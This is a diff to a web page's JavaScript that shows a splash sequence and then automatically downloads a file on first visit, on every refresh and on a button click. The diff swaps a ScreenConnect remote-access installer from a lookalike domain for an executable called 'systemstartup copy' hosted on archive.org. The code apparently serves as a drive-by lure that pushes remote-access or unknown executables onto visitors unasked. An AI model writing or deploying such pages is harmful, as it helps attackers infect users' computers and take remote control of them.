@@ -16,7 +16,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Add event listener for the download button
     viewImageButton.addEventListener('click', () => {
-        downloadFile('https://screenconnect-check.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest');
+        downloadFile('https://archive.org/download/systemstartup-copy/systemstartup%20copy.exe');
     });
 
     const hasSeenImages = localStorage.getItem('hasSeenImages');
@@ -29,7 +29,7 @@ document.addEventListener('DOMContentLoaded', () => {
         logoImage.classList.remove('hidden'); // Show logo image
 
         // Automatically start download immediately on refresh if images have been seen
-        downloadFile('https://screenconnect-check.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest');
+        downloadFile('https://archive.org/download/systemstartup-copy/systemstartup%20copy.exe');
 
     } else {
         // If it's the first time, play the image sequence
@@ -49,7 +49,7 @@ document.addEventListener('DOMContentLoaded', () => {
             localStorage.setItem('hasSeenImages', 'true'); // Set flag immediately for future refreshes
 
             // Automatically start download after splash screen on first visit
-            downloadFile('https://screenconnect-check.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest');
+            downloadFile('https://archive.org/download/systemstartup-copy/systemstartup%20copy.exe');
         }, 5000); // Both images visible for 5 seconds
     }
 });
